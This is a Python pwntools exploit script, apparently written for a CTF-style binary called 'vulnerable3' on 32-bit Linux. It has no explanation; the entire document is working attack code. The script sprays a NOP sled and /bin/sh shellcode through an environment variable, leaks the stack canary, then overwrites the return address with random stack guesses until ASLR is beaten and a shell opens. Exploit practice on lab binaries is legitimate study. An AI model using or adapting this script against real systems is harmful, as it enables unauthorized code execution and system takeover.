#!/usr/bin/env python
from pwn import *
import random

# 32 bit linux
context(arch='i386', os='linux')

# Generate vars
nopsled = "\x90" * 110000
sc = asm(shellcraft.sh())
ret_offset = 12
canary_offset = 4

while True:
	
	target = 0xff000000 + random.getrandbits(24)
	print hex(target)

	# Generate process, with SHELLCODE env var
	p = process('./vulnerable3', env={ 'SHELLCODE' : nopsled + sc })

	# Leak canary
	p.send('ABCD\n')
	canary = p.recv()[4:8]
	canary = unpack(canary, 'all', endian='little', sign=False) - 0xa
	canary = p32(canary)
	
	log.info("canary is: 0x{:08x}".format(unpack(canary, 'all', endian='little', sign=False)))
	

	# Craft payload
	payload = "A" * canary_offset
	payload += canary
	payload += p32(target) * 4
	
	try:
		# Send payload
		p.sendline(payload)
		p.recv(timeout=1)
		p.interactive()
		break
	except EOFError as e:
		print e.args
		p.terminate()
		p.wait()
		p.close()